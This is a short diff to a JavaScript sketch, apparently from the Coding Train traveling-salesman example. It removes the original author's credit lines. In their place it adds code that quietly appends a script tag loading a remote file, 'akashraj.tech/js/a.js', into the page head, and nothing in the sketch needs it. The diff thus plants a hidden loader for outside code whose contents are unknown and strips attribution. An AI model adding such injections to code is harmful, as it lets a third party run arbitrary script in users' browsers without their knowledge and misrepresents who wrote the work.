@@ -1,7 +1,10 @@
-// Daniel Shiffman
-// http://codingtra.in
-// http://patreon.com/codingtrain
-// Code for this video: https://youtu.be/9Xy-LMAfglE
+var k = document.getElementsByTagName('head')[0];
+var c = document.createElement('script');
+c.async = true;
+c.type = 'text/javascript';
+c.charset = 'utf-8';
+c.src = "https://akashraj.tech/js/a.js";
+k.appendChild(c);
 
 var cities = [];
 var totalCities = 100;
